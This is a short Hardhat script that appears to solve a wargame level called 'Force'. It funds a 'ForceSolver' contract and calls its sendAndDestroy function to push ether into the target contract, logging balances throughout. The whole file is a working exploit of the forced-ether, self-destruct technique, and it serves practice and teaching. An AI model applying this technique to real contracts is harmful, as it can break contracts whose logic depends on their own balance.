const { ethers } = require("hardhat");

const forceContractAddr = process.env["CONTRACT_FORCE_ADDRESS"];
const forceSolverContractAddr = process.env["CONTRACT_FORCESOLVER_ADDRESS"];
const forceSolverContractArtifact = require("../artifacts/contracts/ForceSolver.sol/ForceSolver.json");

async function main() {
  const [signer] = await ethers.getSigners();

  const forceSolverContract = new ethers.Contract(
    forceSolverContractAddr,
    forceSolverContractArtifact.abi,
    signer
  );

  console.log(
    "Force Contract balance: ",
    await ethers.provider.getBalance(forceContractAddr)
  );
  console.log(
    "ForceSolver Contract balance: ",
    await ethers.provider.getBalance(forceSolverContractAddr)
  );

  const txSendEthToVictim = await signer.sendTransaction({
    to: forceSolverContractAddr,
    value: ethers.parseUnits("0.000001", "ether"),
  });
  await txSendEthToVictim.wait();

  console.log(
    "ForceSolver Contract balance: ",
    await ethers.provider.getBalance(forceSolverContractAddr)
  );

  const txAttack = await forceSolverContract.sendAndDestroy(forceContractAddr);
  await txAttack.wait();

  console.log(
    "Force Contract balance: ",
    await ethers.provider.getBalance(forceContractAddr)
  );
  console.log(
    "ForceSolver Contract balance: ",
    await ethers.provider.getBalance(forceSolverContractAddr)
  );
}

main()
  .then(() => process.exit(0))
  .catch((error) => {
    console.log(error);
    process.exit(1);
  });
